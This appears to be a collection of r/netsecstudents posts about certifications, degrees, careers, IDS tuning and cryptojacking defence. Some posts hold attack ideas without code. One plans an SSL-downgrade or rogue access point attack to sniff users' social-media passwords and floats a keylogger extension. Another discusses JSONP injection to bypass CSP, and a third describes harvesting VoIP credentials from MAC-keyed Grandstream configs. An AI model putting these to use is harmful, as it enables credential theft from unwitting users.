feedback!"

My first contact with security was at a company where I was working as a SysAdmin and that they wanted to implement a vulnerability scanner. Therefore I took that project and did all the architecture design (for the core and the probes) and learnt quite a lot in a really hands on way. Afterwards I asked myself ""why not?"" and got OSCP and last year I noticed that my knowledge about web applications pentesting was somewhat lacking in all the tricky parts of auditing. My first idea was to do CTFs and read a lot and, whilst I leart many things that way, I was still missing the basis and targeted practice. A friend of mine had taken the PTS and recommended the eLearnSecurity courses. I attended a couple of webminars and though ""why not?"". At first, the amount of materials appear to be incredibly big. And it is. The instructors have prepared really complete materials, with many PoC examples and live demos, that allow understanding the concepts really easy. Many times, at work, I would know what a vulnerability was but now, after watching the PoC or reading the detailed examples, I would also know other ways of exploiting it and, more important, understanding it correctly made me able to defend my results when a client would ask about real risks after a pentest. Moreover, if something is not clear or additional doubts appear while studying the materials (they will do, trust me), both instructors, students and alumni are pretty active in the forums and will help with the questions. It is really helpful, specially with the challenges they propose for learning all concepts which takes me to the other great thing, from my pov, about eLearnSecurity certification: labs. Labs are divided mainly in three parts: those instructors use in the PoC, the labs where you apply what you have learnt in a guided way and challenges where my advice is to try to treat as a full pentest. When you finish all labs, you will have seen, between 30 and 40 different applications, all with their different vulnerabilities. If you analyze all of them as if a full pentest was taking place, that means an amount of practice that will help you during your professional life to achieve more complete results and to understand better the potential failure points in an application. And now... the other important point. How long have it taken me to get the eWPT certification? Well, I have employed approximately 60 study hours. I was not able to study everyday, but just reading the materials, making my own summaries and then doing all labs was it for me. Thanks for bearing with this review... if you guys have any additional question, I'll be happy to answer. "

He has some knowledge in programming languages, but not broad. Therefore i'd want the syllabus to start from zero and mainly go through: * C * Assembly (just basic overall understanding, no necessarily learning the language) * Some linux basics will be awesome * Computer and memory structure * What is a vulnerability and information about vulnerability-searching in C * exploiting in different OS's * Basic crypto Is there some known syllabus that follows (at least mainly) this with references to relevant books (with hope that it goes down to the level of relevant chapters in those books)?

The flaw can be anywhere in the infrastructure, on the cloud (whichever company's servers), during transport over the network, in an application etc. It's pretty broad. An example would be if a common form of encryption that is used can be broken. My plan was to use sslStrip2 to downgrade hsts communications on a network in order to sniff a users username and password as they connect to a social service. But after messing around with it i've realised that all browsers now have a preloaded hsts list which ensures all communication with the websites listed is through https. (side note - reddit is still vulnerable on internet explorer 10) If I were to create a malicious access point as a MitM attack, would it still be possible to perform a ssl downgrade? I think it works, but won't work if the victim is using a browser which has a preloaded hsts list. Other options i've thought of are; -creating a chrome extension which would act as a key logger, or some other malicious chrome/firefox extension -attempting to breach a devices security over a LAN and retrieving social media credentials -creating an application which connects to social media, like a facebook app, which could be used for malicious purposes. After researching, I'm pretty sure finding a security vulnerability on any social media platform directly would be too difficult - that's why I thought using an ssl downgrade attack would be good as it is a protocol which is used by every large website. do any of you have any recommendations or can you think of any other/better direction for me to try? Thank you. (x-posted to r/asknetsec)"

Off the top of my head I'd be using aircrack, msf, and what ever password cracker I need. I can find individual videos and info for the different steps, but I'm looking for more of a cumulative/comprehensive approach that builds off each step, rather than trying to piece broken steps together, along with showing what tools are the best to be used in a particular situation.

I've [posted before regarding the program](URL and I'm here with another update as I start wrapping up the ""concentration"" classes of my degree. For background, I'm an infosec analyst working for an enterprise who does a little bit of everything, from pentesting, to configuring MPSs, vulnerability management, etc. I'm going to be very blunt and not sugar coat anything. I'm sure NU employees may read this and please take it as constructive criticism as the program can be taken from ""decent"" to ""great"" in a few moves. First off I will only be talking about the Computer Forensics and Vulnerability Management Concentration as well as some of the foundational courses. I won't be talking about the Information Warfare and Security Management Concentration and general education classes. For starters, Norwich is an excellent school *for the money*. Let me make it perfectly clear in saying you will not be fully ready and prepared for what the typical infosec analyst will experience, but it gives a decent foundation, which is usually all that employers are looking for anyways. Just don't have the expectation that since you graduated you should know exactly what to expect. I feel they could certainly update content to reflect on modern day practices. It definitely feels like some of this program was developed 5 years ago, which is a lifetime in IT, especially in some aspects more than others. Norwich's cost per credit is *very* cheap ($375/CrH) and the convenience online is what drew me toward the program (as well as their reputation). Already being in IT for awhile and being in an infosec role, I knew a lot of what they were already teaching and for some classes I could put 2 hours a week into and pass with flying colors, where others were very challenging and required much more time and concentration. Here's the classes I've taken so far and my review of each one. **Fundamentals of Computer Networking** - Self-explanatory and nothing fancy here. It's a decent class with a good instructor. **Programming with High Level Language** - This is C++. This is the language you start out with. It's harsh and difficult for those who haven't programmed before and even for those who have done basic programming in bash or python, this still may come as a challenge (it did for me). While I'm not sure the point of starting out with this language and not teaching Python, Java, or even Ruby, it's only saving grace is the instructor who is one of the best. He will have WebEx meetings with you if you do not understand the material and walk you through the labs if you're having trouble. Aside from that, this class should be replaced with Python or Java in my opinion. Or even, at the very least, C. **Programming with a Low Level Language** - As most people know, ""low level language"" is Assembly. ASM sucks and I hate it. It is a necessary evil, as it's used for exploit research, malware forensics, and in some cases, shellcoding, however 8 weeks for a crash course on ASM using an awful book means that even the same instructor from Programming 1 cannot save this class. It needs either another ASM class with it or a whole new book and format. The class was slightly disorganized as my Visual Studio didn't work with code the same way as the instructors. After watching all the videos for Shellcoding on PentesterAcademy.com, where he gives a crash course on ASM, I learned more in 4 hours from Vivek than I did in 8 weeks at Norwich. That's all that needs to be said about this class. It should also be mentioned there is no shellcoding here or malware analysis. It's just making calculator programs in ASM. **Windows Server Administration** - Very average class. The professor is the ""head"" of the entire program so you'd probably expect something more than ""here's a virtual lab, go do the exercise that walks you through it, then take this quiz"". The book is decent but for a cyber-security program you'd expect the Windows course to have at least 1 week to focus on security. **Linux Administration** - Probably the worst class and professor so far. I wouldn't even consider him a professor, he's just a student aid who grades the written labs against a rubrick. Absent in the discussion forums, frequently was late to post grades, labs were a shit show to say the least (the lab program they use was the worst I've ever used), and overall they omitted things that are vital to security. **Vulnerability Testing I** - Disappointing I guess is the word I'll use. I pushed to take this class before but my adviser said it's really advanced and I wasn't ready. Finally a few semesters later I pushed again and finally was scheduled for it, only to walk into a ""nmap, metasploit, and Nessus course for Dummies"" book (not literally but close enough). The set up is neat; there's no quizzes in this class and the labs/exams are ""break into this box and type up a report"". The disappointment is in the lack of challenge. Anyone can run Nessus, read it's vulnerability output, then exploit it with a Metasploit module. Since this was the first class though I assumed it was supposed to be really easy as an intro and get harder. **Vulnerability Testing II** -- Extremely disappointing is the phrase I'll use here. I expected this class to be much more difficult, as ASM was to C++, but this was just a continuation of ""run nmap, run Nessus, use metasploit"". As some of you well know, as do I, pentesting is *so much more* and I was really hoping to learn something here, but for the midterm it was literally just Metasploitable 2 and DVWA. One week was spent on Web Pentesting with Mutillidae and the effort put into the VMs is so low; they're just recylced and reused so the exploit you used in your week 1 lab is the same exploit you'll use in your final. I literally exploited MS03 DCOM at least 8 separate times. The final exam is just to to break into a few boxes with one of them using Mutillidae and DVWA. At least make it challenging! I was expecting the difficulty to be on par with ""easy"" VMs on Vulnhub, but instead I literally got Metasploitable 2 and DVWA. My other complaint about this class is the version of Kali is so old and some of the tools outdated, that for the ""Payload creation"" week you're using *msfpayload and msfencode*. For those unaware, those were both [replaced over a year and a half ago](URL by msfvenom. This is what I'm talking about when I say this program was clearly designed several years ago and fails to update. You will never use custom scripts in this class, you will never use any scripts from sploitsearch, you will never get into modifying previous scripts or creating your own, you don't go into shellcoding, privilege escalation &amp; cronjob jacking, brute forcing, etc. Basically you hardly go over anything besides Nmap, Nessus, and Metasploit. The hardest part of this class is typing up the reports which have unclear guidelines as far as the direction of the report (as in: am I reporting this to the instructor, a client, or someone else) and are graded as such that if you try to be clever at all, you'll be dinged for not doing it ""his way"". Overall I'm in no rush to get this degree, as to me it's just a piece of paper at this point and purely for merit. I'm reimbursed from my work so I figured why not. My next classes are Malware analysis which is the same instructor from Programming 1 &amp; 2 and network forensics, which I feel will just be a glorified PCAP analysis/Wireshark-for-dummies course. I think that there should be an entire class for Web App testing, instead of 1 week with Multillidae, as Web App is such a huge part of pentesting in general. **The question people are probably wondering is**: *So is it worth it?* and my answer would be yes if you're just looking for a cheap degree. Will you learn things you don't know? Absolutely. I definitely did. Was what I learned worth the tens of thousands of dollars in debt? Nah, not with experience already in IT and security. As I said before, I think there's a lot of vital information they could've used to update their classes to make it more relevant for the world today and I feel like as a cyber-security program, every class should have some talk about security in it, where most did not. But if anyone has any questions, fire away!"

I've come across a few of these scripts recently doing a JSONP request. In the request there's always a callback parameter and I've found that frequently there is no filtering on the name of the parameter. So we can do something akin to URL and pop an alert... well we could if we could get the code to execute. That tends to be the problem. The code is reflected from the GET request, but in all the cases I've found the server is returning it as javascript. So, we'd have to get a webpage to actually include and execute the code. This seems like it should be a vulnerability and I want to report it to the places I've found it, but I'd also like to have some use cases where it's actually a problem. As it is, we'd need another way to inject something into a page to get this to work... which may be why it doesn't seem to be guarded very well... The only place I can think of where this might be useful would be if domain bar.com implements CSP, blocks inline execution, allows code from foo.com, AND has a vuln that allows for injecting HTML... AND foo.com has a script vulnerable to this injection. Then you could bounce your JS off of foo.com and into bar.com bypassing their CSP. This seems contrived though.. Does anyone else have any suggestions or ideas of how this could be used? "

I am currently working on my thesis and one of my subjects is to determine what must be kept in mind while tuning Intrusion Detection System alerts. The organization that I am working for is already in the process of tuning the alerts, but the SOC is still relatively young. With this topic Id like to start a discussion if the following list is a complete list of things you need to be aware of while tuning IDS alerts. Currently the list of points of attention/ground rules consists of:  What does the rule deliver? Can the alerts be useful if the False Positives are filtered out?  Is the environment vulnerable for this attack?  What is the impact of the vulnerability, based on the CVSS score.  What are the possibilities for tuning? o Increasing the threshold (trigger alert if 100 alerts trigger in 60 seconds); o Are there other rules that could detect this kind of traffic/attack?  Before applying a change, the change must be accepted by multiple departments.  Turning off a rule can be seen as a last possibility.  After a week evaluate the change. What are your thoughts on this list? Does it looks like the list is complete? Are extra points of attention/ground rules required? If you are missing any context on this subject please let me know so I can edit the starting post. I hope we can start a discussion on this and looking forward to your reactions."

A few months ago I switched from the awful dsl available in my area to much faster cable. As part of this switch I went from pots to voip. To facilitate this my new isp provided an analog telephone adapter, a HandyTone h701 from Grandstream. When I received it, it was not provisioned so I could access the web interface and change whatever I liked. I noticed it has the option of setting custom frequencies for the dial tone and had some fun trying to get it to play simple music. Later after it was provisioned I was a bit disappointed that the default user account could not modify the dial tone and started to explore to see if I could regain that functionally. As it turns out every time it boots it pulls a config file, Unfortunately for me the config is encrypted using aes256. However I had noticed that there was no key set on the device when I got it and provisioning was done remotely, so what was the device using for a key? I grabbed a copy of the config generation tool from the Grandstream website and managed to reverse engineer it (thank god .net does not compile to assembly). As it turns out the encryption effectively uses the mac address of the device as a key and the mac is used to get the config (it is a get request to the provisioning server /cfg&lt;device mac&gt;). All devices from Grandstream start with the same organization id for the first half of the mac so in about an hour I could have downloaded all of the configs from my provider and extract the associated name, userid's and passwords. Then from there make or receive calls as that user. I googled to find out if anyone else was aware of this issue and manged to find [this](URL It would appear that Grandstream has no desire to fix this issue as it has been open and reported for 7 years and still exists. I reported it to my isp and they implemented a solution on their end but as far as I cant tell these a very popular brand of adapters (I know at the least walmart resell them under their own brand although with a slightly modified firmware and most likely different provisioning) that have major security issues. So Reddit, what can I do? TL;DR Mac addresses are not unguessable or good keys but some will still use them as such."

For my thesis, I'd like to do something regarding/related to penetration testing/vulnerability assessment, as I quite like this aspect and would like to delve into it more. I've written a few hobby projects, such as my own packet parser for libpcap, but this was not meant for my thesis, only for my own _amusement_, to get a more practical understanding of various protocols. Unfortunately I'm really out of ideas on what new I could implement, as we are required to write code, and I would not like to re-invent the wheel. (Such as writing my own vuln. scanner, as they exist in many shapes and forms.) One of my ideas was to write an NVT for OpenVAS, which would download the fresh CVEs from NVD, and parse the CPE entries in them, and check to see if any service banner is known to be vulnerable, so I could alert about a vulnerability after it's been added to NVD, but before an NVT is written to test it. However, after searching some more, if I understand correctly, this is exactly what SCAP does, therefore it's already implemented, and I'm fresh out of ideas. :( Any idea would be greatly appreciated!"

My friend who had multiple internships and was doing research through our school came out of college with a 90k job(smart dude and location had a factor). Even if you dont think youd get the internship, it never hurts to apply. Even if it doesnt relate to the job title you want, still shoot for it.

I mainly deal with compliance with ISO 27001. For a long time, I have been fascinated by the technical side of security, to get the basics I started engineering studies in computer science. I will not lie, it is quite hard, I'm 30+ and I run a one-man company and I am currently studying mainly mathematics. I have more and more moments of doubt. I dug through a ton of guides, posts and opinions from professionals in the field of information security on how to start your adventure with cyber security. I am motivated, and I know where to start, from scratch for e.g. Comptia Network +, Security +, udamy courses etc. I know what I should learn, I have all the materials I need (courses, books, etc.), I just lack the right amount of time. But in hard times I wonder if what I do is the right approach. Do you think it is better to learn the basics from books and courses, or to learn more while solving specific and real problems? I read stories of people who decided to start the adventure with bug bounty, began with real problems and learned to learn about individual vulnerabilities and techniques. However for now I learn mainly from courses and books and in practice it resembles mainly studying for exams than solving real world problems. I am interested in the security of web applications, finding vulnerabilities and their analysis. Another thing is learning programming, I decided to start with C ++, I have a very nice book by Bjarne Stroustrup, but currently I really don't know where should I put my hands in.

I am setting up an environment and I have found myself with the ability to help others to learn how to hack. I am looking for some (5-10) candidates to work on breaking out of hypervisor environments. This is all private cloud type stuff so there is no liability for working in the public cloud. This is a free opportunity for candidates that do not have the resources to work on their own equipment. Preferential treatment will be given to under-privileged candidates with proper vetting. I will provide VPN access to a virtualized environment with the setup that you prefer working in. I will not set up antiquated systems, unless you just want to practice on those. I will also post the write-ups at your discretion on a website page/security blog for you. If you need, after verifying escapes/hacks I will also make your write-up professional and technical so you can submit it on your resume. Time slots will be scheduled to your availability, and there will be a group chat, and a wiki for candidates to post to. Since this is a group effort, alternating leaders will take the helm in agreed upon intervals. The group will establish ground rules. I can help you to learn a handful of different project management techniques, and I have enough cybersecurity resources that it would take a lifetime to master. If you are interested, pm me for further details. This will take some effort and references on your part, but over time you will earn references from your peers and myself."

This was a small job fair strictly about CyberSecurity. We were looking for an intern to be on our team for the summer, and we had a few open positions in other IT departments. I was with my boss, and an HR rep. A small bit about me - I'm 35 and have been in IT for 14 years as analyst, sysadmin, and now security. Here are some thoughts: 1) Talk about you. This should be obvious, but one candidate asked so many questions about our company that we didn't get a good sense of him. 2)I bet that guy was really smart. Some of us in IT are a bit socially awkward. Find a way to own that. When one of the candidates walked away my boss said ""I bet that guy was really smart."" If you are socially awkward find someone to help you learn to talk to people and be modestly comfortable in job interviews/networking events. 3)ID the people at the table. If there is more than one person - ID them, are they HR, or a Manager, co-worker. One guy came up and peppered me(non-manager/hr) with questions about the field. He seemed to know what he want and if he did the same at every table, probably left with a lot of good tips. &amp;#x200B; 4)IT is lucrative. Best part of the day for me was when I asked why a candidate who transferred from Accounting to IT made the switch he said ""IT is lucrative"" 10 points for honesty. 0 consideration for our internship. Not all of us are SUPER passionate about IT. Really some of us are here for the money, I get it. I don't find that as offensive as some in the field do. But when you are talking to HR or people recruiting - have a better answer. Hope this helps soon to be job seekers"

166,cybersecurity,netsecstudents,Leaving years of web development and getting into cybersecurity in my 30s,1,ezdq8w,https://www.reddit.com/r/netsecstudents/comments/ezdq8w/leaving_years_of_web_development_and_getting_into/,2020-02-06 05:14:49,"I've always been drawn to hacking and cybersecurity in general, but few years ago I seriously got interested in, and involved myself with, cryptocurrencies in various ways, which raised my awareness for privacy and anonymity much higher than usual, so I had to get involved in this field more seriously now. I am 33 years old computer science college dropout and I have 7+ years of professional experience as frontend developer. When I was 4 exams away from graduation, two business opportunities presented themselves within the span of couple of weeks. The first offer was system administrator at the national library in the capital city of a country I live in. The second one was remote work as frontend developer. Both of these are my passions, but I chose frontend development back then and that was my first official job in IT. After a month it was clear to me that I'm either gonna have to leave work and finish college, which was only 4 exams away from graduation, or irrationally drop out from college and continue working. I dropped out and never looked back at my formal education ever again. Fast forward, here I am today. A 33 years old frontend developer with no wife and kids, and with a good salary. However, a day does not go by without thinking about that first gig offer as system administrator and what would my life be like if I chose that path. I think that gig was pretty much rigged in my favor back at the time, since my friend already worked there and he had some experience already. I was just a Linux enthusiast and it seemed to me that my friend was ready to drag me along with him through work until I get all the ropes, because I sure as hell wasn't qualified as system administrator back then by skills and expertise (I'm still not). However, after all these years, I just can't let go of this other passion of mine, which is cybersecurity. I have to try. Here's my starter roadmap: * Acquire Network+ and Security+ * Leave frontend development behind me, along with my senior position and good salary * Get a job as system administrator or network administrator, along with junior position and lower salary * Acquire CySA+, CCNA, RHCSA * Get a job for entry level cybersecurity role of any kind Starter roadmap should be cleared in up to 5 years. I'm not sure how I'd like to progress after that at this point, but further progression may look like something like this: SSCP, GSEC, OSCP, CISSP... I am **willing** to: * Leave frontend development, my second ongoing passion, behind me * Leave my current senior position * Leave my current good salary * Leave my current location I am **not willing** to: * Work second or third shift, but I am willing to appear at work at any time of day or night if an incident occurs * Work as help desk On work days, I am usually able to steal 2-3 hours of corporate time and learn for certification at work, plus additional 2-3 hours when I get back home after work. For weekends, I usually have around 20 hours of time to learn. Would it be considered as drawback if I look for a job for junior system/network administrator when I'm 33/34 years old? Would you jump into trial by fire if you were in my position right now? Am I being real here? I am kindly asking cybersecurity community of Reddit to share their thoughts with me on this topic conidering my situation and, if possible, to provide their own most probable version of starter roadmap, where the last item on that map would be '**Get a job for entry level cybersecurity role of any kind**'. Thank you"

Apps are moving to the cloud. A companys device and application mix are increasingly heterogeneous. All of these factors are breaking down the enterprise security perimeter, rendering traditional security approaches obsolete, and paving the way for zero-trust approaches. Traditional security methods broadly classify everything (users, devices and applications) inside the corporate network as trustworthy. These models leverage legacy technologies, such as virtual private networks (VPNs) and network access control (NAC), to verify the credentials of users outside the network before granting access. The focus therefore is on strengthening the network perimeter and then granting full access to corporate data once credentials are successfully validated. This is sometimes referred to as the castle and moat approach, in which the castle refers to the enterprise holding valuable data and applications, while the moat refers to layers of protection aiming to keep potential threats out.

176,cybersecurity,netsecstudents,"What is cryptojacking? How to prevent, detect, and recover from it",1,et3ac6,https://www.reddit.com/r/netsecstudents/comments/et3ac6/what_is_cryptojacking_how_to_prevent_detect_and/,2020-01-24 12:43:48,"Criminals are using ransomware-like tactics and poisoned websites to get your employees computers to mine cryptocurrencies. Heres what you can do to stop it. **Cryptojacking definition** Cryptojacking is the unauthorized use of someone elses computer to mine cryptocurrency. Hackers do this by either getting the victim to click on a malicious link in an email that loads **cryptomining** code on the computer, or by infecting a website or online ad with JavaScript code that auto-executes once loaded in the victims browser. Either way, the cryptomining code then works in the background as unsuspecting victims use their computers normally. The only sign they might notice is slower performance or lags in execution. **Why cryptojacking is popular** No one knows for certain how much cryptocurrency is mined through cryptojacking, but theres no question that the practice is rampant. Browser-based cryptojacking grew fast at first, but seems to be tapering off, likely because of cryptocurrency volatility. In November 2017, [Adguard reported a 31 percent growth rate](URL for in-browser cryptojacking. Its research found 33,000 websites running cryptomining scripts. Adguard estimated that those site had a billion combined monthly visitors. In February 2018, [Bad Packets Report](URL found 34,474 sites running Coinhive, the most popular JavaScript miner that is also used for legitimate cryptomining activity. In July 2018, [Check Point Software Technologies reported](URL that four of the top ten malware it has found are crypto miners, including the top two: Coinhive and Cryptoloot. However, [Positive Technology's Cybersecurity Threatscape Q1 2019](URL report shows that cryptomining now accounts for only 7% of all attacks, down from 23% in early 2018. The report suggests that cybercriminals have shifted more to ransomware, which is seen as more profitable. Cryptomining is in its infancy. Theres a lot of room for growth and evolution, says Marc Laliberte, threat analyst at network security solutions provider WatchGuard Technologies. He notes that Coinhive is easy to deploy and generated $300 thousand in its first month. Its grown quite a bit since then. Its really easy money. Cryptojacking doesnt even require significant technical skills. According to the report, [The New Gold Rush Cryptocurrencies Are the New Frontier of Fraud](URL from Digital Shadows, cryptojacking kits are available on the [dark web](URL for as little as $30. The simple reason why cryptojacking is becoming more popular with hackers is more money for less risk. Hackers see cryptojacking as a cheaper, more profitable alternative to ransomware, says Alex Vaystikh, CTO and cofounder of SecBI. With ransomware, a hacker might get three people to pay for every 100 computers infected, he explains. With cryptojacking, all 100 of those infected machines work for the hacker to mine cryptocurrency. \[The hacker\] might make the same as those three ransomware payments, but cryptomining continuously generates money, he says. The risk of being caught and identified is also much less than with ransomware. The cryptomining code runs surreptitiously and can go undetected for a long time. Once discovered, its very hard to trace back to the source, and the victims have little incentive to do so since nothing was stolen or encrypted. Hackers tend to prefer [anonymous cryptocurrencies like Monero and Zcash](URL over the more popular Bitcoin because it is harder to track the illegal activity back to them. **How cryptojacking works** Hackers have two primary ways to get a victims computer to secretly mine cryptocurrencies. One is to trick victims into loading cryptomining code onto their computers. This is done through phishing-like tactics: Victims receive a legitimate-looking email that encourages them to click on a link. The link runs code that places the cryptomining script on the computer. The script then runs in the background as the victim works. The other method is to inject a script on a website or an ad that is delivered to multiple websites. Once victims visit the website or the infected ad pops up in their browsers, the script automatically executes. No code is stored on the victims computers. Whichever method is used, the code runs complex mathematical problems on the victims computers and sends the results to a server that the hacker controls. Hackers often will use both methods to maximize their return. Attacks use old malware tricks to deliver more reliable and persistent software \[to the victims computers\] as a fall back, says Vaystikh. For example, of 100 devices mining cryptocurrencies for a hacker, 10% might be generating income from code on the victims machines, while 90% do so through their web browsers. Some cryptomining scripts have worming capabilities that allow them to infect other devices and servers on a network. It also makes them harder to find and remove; maintaining persistence on a network is in the cryptojacker's best financial interest. To increase their ability to spread across a network, cryptomining code might include multiple versions to account for different architectures on the network. In one example described in an [AT&amp;T Alien Labs blog post](URL the cryptomining code simply downloads the implants for each architecture until one works. The scripts might also check to see if the device is already infected by competing cryptomining malware. If another cryptominer is detected, the script disables it. A cryptominer might also have a kill prevention mechanism that executes every few minutes, as the AT&amp;T Alien Lab post notes. Unlike most other types of malware, cryptojacking scripts do no damage to computers or victims data. They do steal CPU processing resources. For individual users, slower computer performance might be just an annoyance. Organization with many cryptojacked systems can incur real costs in terms of help desk and IT time spent tracking down performance issues and replacing components or systems in the hope of solving the problem. **Real-world cryptojacking examples** 1. **Spear-fishing PowerGhost steals Windows credentials** 2. **Graboid, a cryptominder worm spread using containers** 3. **MinerGate variant suspends execution when victim's computer is in use** 4. **BadShell uses Windows processes to do its dirty work** 5. **Rogue employee commandeers company systems** 6. **Serving cryptominers through GitHub** 7. **Exploiting an rTorrent vulnerability** 8. **Facexworm: Malicious Chrome extension** 9. **WinstarNssmMiner: Scorched earth policy** 10. **CoinMiner seeks out and destroys competitors** 11. **Compromised MikroTik routers spread cryptominers** **How to prevent cryptojacking** Incorporate the cryptojacking threat into your [security awareness training](URL focusing on phishing-type attempts to load scripts onto users computers. Training will help protect you when technical solutions might fail, says Laliberte. He believes phishing will continue to be the primary method to deliver malware of all types. Employee training wont help with auto-executing cryptojacking from visiting legitimate websites. Training is less effective for cryptojacking because you cant tell users which websites not to go to, says Vaystikh. **Install an ad-blocking or anti-cryptomining extension on web browsers.** Since cryptojacking scripts are often delivered through web ads, installing an ad blocker can be an effective means of stopping them. Some ad blockers like Ad Blocker Plus have some capability to detect cryptomining scripts. Laliberte recommends extensions like [No Coin](URL and [MinerBlock](URL which are designed to detect and block cryptomining scripts. **Use endpoint protection that is capable of detecting known crypto miners.** Many of the endpoint protection/antivirus software vendors have added crypto miner detection to their products. ""Antivirus is one of the good things to have on endpoints to try to protect against cryptomining. If its known, theres a good chance it will be detected,"" says Farral. Just be aware, he adds, that crypto minor authors are constantly changing their techniques to avoid detection at the endpoint. **Keep your web filtering tools up to date.** If you identify a web page that is delivering cryptojacking scripts, make sure your users are blocked from accessing it again. **Maintain browser extensions**. Some attackers are using malicious browser extensions or poisoning legitimate extensions to execute cryptomining scripts. **Use a mobile device management (MDM) solution to better control whats on users devices.** Bring-your-own-device (BYOD) policies present a challenge to preventing illicit cryptomining. MDM can go a long way to keep BYOD safer, says Laliberte. An MDM solution can help manage apps and extensions on users devices. MDM solutions tend to be geared toward larger enterprises, and smaller companies often cant afford them. However, Laliberte notes that mobile devices are not as at risk as desktop computers and servers. Because they tend to have less processing power, they are not as lucrative for the hackers. None of the above best practices are foolproof. In recognition of that, and the growing prevalence of cryptojacking, cyber risk solution provider Coalition now offers service fraud insurance coverage. According to a [press release](URL it will reimburse organizations for and direct financial losses due to fraudulent use of business services, including cryptomining. **How to detect cryptojacking** Like ransomware, cryptojacking can affect your organization despite your best efforts to stop it. Detecting it can be difficult, especially if only a few systems are compromised. Dont count on your existing endpoint protection tools to stop cryptojacking. Cryptomining code can hide from signature-based detection tools, says Laliberte. Desktop antivirus tools wont see them. Heres what will work: **Train your help desk to look for signs of cryptomining.** Sometimes the first indication is a spike in help desk complaints about slow computer performance, says SecBIs Vaystikh. That should raise a red flag to investigate further. Other signals help desk should look for might be overheating systems, which could cause CPU or cooling fan failures, says Laliberte. Heat \[from excessive CPU usage\] causes damage and can reduce the lifecycle of devices, he says. This is especially true of thin mobile devices like tablets and smartphones. **Deploy a network monitoring solution.** Vaystikh believes cryptojacking is easier to detect in a corporate network than it is at home because most consumer end-point solutions do not detect it. Cryptojacking is easy to detect via network monitoring solutions, and most corporate organizations have network monitoring tools. However, few organizations with network motoring tools and data have the tools and capabilities to analyze that information for accurate detection. SecBI, for example, develops an artificial intelligence solution to analyze network data and detect cryptojacking and other specific threats. Laliberte agrees that network monitoring is your best bet to detect cryptomining activity. Network perimeter monitoring that reviews all web traffic has a better chance of detecting cryptominers, he says. Many monitoring solutions drill down that activity to individual users so you can identify which devices are affected. ""If you have good egress filtering on a server where youre watching for outbound connection initiation, that can be good detection for \[cryptomining malware\],"" says Farral. He warns, though, that cryptominer authors are capable of writing their malware to avoid that detection method. **Monitor your own websites for crypto-mining code**. Farral warns that crypto jackers are finding ways to place bits of Javascript code on web servers. ""The server itself isn't the target, but anyone visiting the website itself \[risks infection\],"" he says. He recommends regularly monitoring for file changes on the web server or changes to the pages themselves. **Stay abreast of crypto jacking trends.** Delivery methods and the crypto-mining code itself are constantly evolving. Understanding the software and behaviors can help you detect crypto jacking, says Farral. ""A savvy organization is going to stay abreast of whats happening. If you understand the delivery mechanisms for these types of things, you know this particular exploit kit is delivering crypto stuff. Protections against the exploit kit will be protections against being infected by the cryptomining malware,"" he says. **How to respond to a cryptojacking attack** **Kill and block website-delivered scripts.** For in-browser JavaScript attacks, the solution is simple once cryptomining is detected: Kill the browser tab running the script. IT should note the website URL thats the source of the script and update the companys web filters to block it. Consider deploying anti-cryptomining tools to help prevent future attacks. **Update and purge browser extensions.** If an extension infected the browser, closing the tab wont help, says Laliberte. Update all the extensions and remove those not needed or that are infected. **Learn and adapt.** Use the experience to better understand how the attacker was able to compromise your systems. Update your user, helpdesk and IT training so they are better able to identify cryptojacking attempts and respond accordingly. SOURCE LINK: [URL (Sometimes requires you to log-in)."

178,cybersecurity,netsecstudents,Advice for pursuing a career in Cyber Security. (I'm in NYC),1,evikqv,https://www.reddit.com/r/netsecstudents/comments/evikqv/advice_for_pursuing_a_career_in_cyber_security_im/,2020-01-29 16:38:26,"So some background info: I recently graduated from Stony Brook University with a BS in Computer Information Systems and a specialization in Systems and network administration. I'm also enrolling in a certification program that trains you for 17 weeks in order to attain your Cisco CCNA Cyber Ops Certification. The institution is called Per Scholas and I've heard there a other programs like this where they'll invest in people who prove they are qualified to be accepted and trained and that the the program is free for those with low income. This training program also helps the accepted individuals professionally (resume, elevator pitches) and to network with IT professionals and to also help you land decent entry level positions like a cyber security analyst etc. It feels like this could help me transition into a full time position. There's also a chance for the students who complete the program could get a paid internship with Barclays after the program since they're one of the sponsors for the program. reference: [URL &amp;#x200B; I've also been accepted into a cyber security Grad program at SUNY Polytechnic Institute (18 month program in Utica) but the real issue lies here. Because I come from a low income background I was able to get financial aid to help with the undergrad, but I know grad school doesn't. And the costs go even further if you have to move out closer to this distant school. But it's been recommended to me and I've personally read about this grad program and it seems quite reputable. But there's a diversity scholarship that will cover the costs of tuition and offer a stipend to live near and further grants awarded if you dedicate yourself to additional responsibilities if you get it (of course it's extremely competitive) and prior to getting into grad school there are 2 courses they've required me to take at a local college before they fully allow me to enroll but at this time no further financial aid will be given unless its loans so there are further costs to consider. So this path while seems to have a lot to gain has a lot of financial risks. I don't think there are any CUNY grad programs that offer a cyber security program unless I missed them (correct me if I've missed any). The plan was that if I get the scholarship I would decide to pursue this MS program. Otherwise I would try to make the best of the certification program One last part to the grad program is that the school offers the entire program online. But I don't know how effective it is to take a grad course online or if that it's worth considering. reference : [URL Last questions: So how necessary is grad school for a career in Cyber security? Although my major leans in the field of network administration, there are many concepts I've learned that are also needed in this career. So the practical knowledge is what I value. And both the certification course and grad program emphasize on physical/practical knowledge and testing that will help make me qualified for a solid career. Is it fine to build a career in NY, what are some other states you would recommend looking into building a career whats a good salary to aim for? Last thoughts, I'm 22 so I'm trying to weigh my options so I can properly plan my future so any thoughts, concerns, and recommendations are appreciated. Thanks for reading."

I'm a information systems cybersecurity student who loves what he's studying to do, but doesn't have the motivation to mess with it outside of the classroom. I must sound like a real PoS compared to some of you, and I certainly feel like one. I'm also an artist, but I barely do that, either. Anxiety and guilt keep me paralyzed, and that kind of paralysis has kept me from truly, fully enjoying life as of late. I've been working Postmates for little to nothing to fill the void and beat back-- you guessed it-- money anxiety, but I'm gonna do a config and support class, as well as a basic Windows Server config class, starting today. I'm excited, as I don't feel like I had enough experience with WinServer during my Network+ class. Which brings me to another point: I did not take the actual Network+ exam directly after finishing the related course. Same with Security+, which I took more recently. This is because these tests cost a relatively big chunk of change, one that I won't have for myself without destroying what savings I have, and one that I know my dad (who's paying my community college tuition at present) won't be happy about. Tensions between my family and I are high for reasons I can't get into. They seemingly feel betrayed by me because of something I did that I chose to do for myself, something I did not disclose to them for fear of this exact reaction. This does not make learning an easy task, with this background noise, nor does it make even existing at home an easy task. I'm home alone through the end of this week, and I know my mental health will go right back into the toilet when my dad and stepmom return. The best I can do is work hard on my new classes and grind out some cash while I still feel okay. But I need to get motivated to actually make tangible steps to stand out to potential employers, and that involves work. Work that I'm willing to put in... most of the time. I do want to become a competent 